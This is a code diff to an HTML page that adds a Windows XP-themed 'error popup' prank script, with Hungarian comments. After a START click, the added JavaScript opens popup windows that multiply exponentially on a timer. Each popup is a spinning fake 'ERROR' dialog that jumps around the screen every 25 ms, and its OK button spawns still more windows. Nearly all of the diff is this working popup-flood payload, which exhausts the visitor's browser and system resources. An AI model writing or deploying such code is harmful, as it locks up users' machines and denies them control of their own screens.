@@ -41,52 +41,145 @@
 </head>
 <body>
 
-<<video id="myVideo" loop muted>
+<video id="myVideo" loop muted>
   <source src="Windows XP Installation Music.mp4" type="video/mp4">
 </video>
-
 
 <audio id="myAudio" src="Windows XP Crazy Error Full ｜ 1080p 60 fps.mp3" loop></audio>
 
 <button id="startBtn">START</button>
-
 
 <script>
 const video = document.getElementById('myVideo');
 const audio = document.getElementById('myAudio');
 const btn = document.getElementById('startBtn');
 
+let spawnCount = 2;
+
 btn.addEventListener('click', () => {
-    // Videó és hang elindítása
     video.play();
     audio.play();
     video.muted = false;
     audio.muted = false;
 
-    // Ablakok megnyitása
-    const numWindows = 5;
-    for (let i = 0; i < numWindows; i++) {
-        const newWin = window.open(window.location.href, '_blank', 'width=800,height=600');
+    for (let i = 0; i < 5; i++) openXPWindow();
 
-        // Várjunk, amíg betöltődik az ablak
-        newWin.onload = () => {
-            // Gyors "ugrálás" minden 10 ms-ban
-            setInterval(() => {
-                const screenW = screen.availWidth;
-                const screenH = screen.availHeight;
-                const w = Math.floor(Math.random() * 600) + 600; // szélesség
-                const h = Math.floor(Math.random() * 400) + 400; // magasság
-                const x = Math.floor(Math.random() * (screenW - w));
-                const y = Math.floor(Math.random() * (screenH - h));
-                newWin.resizeTo(w, h);
-                newWin.moveTo(x, y);
-            }, 50); // 10 ms → nagyon gyors
-        };
-    }
+    // 🧨 EXPONENCIÁLIS SZAPORODÁS
+    setInterval(() => {
+        for (let i = 0; i < spawnCount; i++) {
+            openXPWindow();
+        }
+        spawnCount *= 2; // 2 → 4 → 8 → 16 → ...
+    }, 3000);
 });
+
+function openXPWindow() {
+  const w = window.open("", "", "width=340,height=200");
+
+  w.document.write(`
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  margin: 0;
+  font-family: Tahoma, Arial, sans-serif;
+  background: #ECE9D8;
+  overflow: hidden;
+}
+
+.wrapper {
+  width: 100%;
+  height: 100%;
+  animation: spin 1.2s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.titlebar {
+  background: linear-gradient(#0A246A, #3A6EA5);
+  color: white;
+  padding: 4px 8px;
+  font-size: 13px;
+}
+
+.content {
+  display: flex;
+  padding: 10px;
+  gap: 10px;
+  font-size: 13px;
+}
+
+.idiot {
+  font-weight: bold;
+  color: red;
+  margin-top: 4px;
+}
+
+.buttons {
+  text-align: center;
+  padding-bottom: 10px;
+}
+
+button {
+  padding: 3px 25px;
+  font-size: 12px;
+}
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="titlebar">Error</div>
+
+  <div class="content">
+    <img src="https://p1.hiclipart.com/preview/502/6/365/windows-xp-security-security-error-icon-png-icon-thumbnail.jpg" width="32">
+    <div>
+      oooooppssssssssss!
+      <div class="idiot">ERROR</div>
+    </div>
+  </div>
+
+  <div class="buttons">
+    <button onclick="ok()">OK</button>
+  </div>
+</div>
+
+<audio id="beep" src="https://www.myinstants.com/media/sounds/windows-xp-error.mp3"></audio>
+
+<script>
+// ❌ OK = SZAPORÍT
+function ok() {
+  document.getElementById("beep").play();
+  window.opener.openXPWindow();
+  window.opener.openXPWindow();
+}
+
+// 🪟 REZGÉS + UGRÁLÁS
+setInterval(() => {
+  const sw = screen.availWidth;
+  const sh = screen.availHeight;
+  const x = Math.random() * (sw - 340);
+  const y = Math.random() * (sh - 200);
+  window.moveTo(x, y);
+}, 25);
+
+// ⏱️ OK NÉLKÜLI SZAPORODÁS
+setInterval(() => {
+  window.opener.openXPWindow();
+}, 2000);
+<\/script>
+
+</body>
+</html>
+`);
+
+  w.document.close();
+}
 </script>
-
-
 
 </body>
 </html>
